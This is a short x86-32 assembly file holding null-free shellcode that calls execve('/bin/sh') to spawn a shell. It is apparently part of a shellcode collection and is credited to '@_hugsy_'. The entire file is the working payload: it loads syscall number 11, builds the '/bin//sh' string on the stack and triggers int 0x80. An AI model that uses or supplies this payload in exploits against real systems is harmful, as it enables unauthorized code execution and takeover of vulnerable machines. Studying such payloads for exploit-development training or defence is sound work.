;;; @@@ arch:x86_32
;;; @@@ endian:little
;;; @@@ syntax:intel
;;;
;;;  x86-32 sys_execve("/bin/sh") null free shellcode
;;;
;;; @_hugsy_

xor eax, eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
mov dword ptr [esp], "nib/"
mov dword ptr [esp+4], "hs//"
xor ebx, ebx
mov byte ptr [esp+8], bl
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80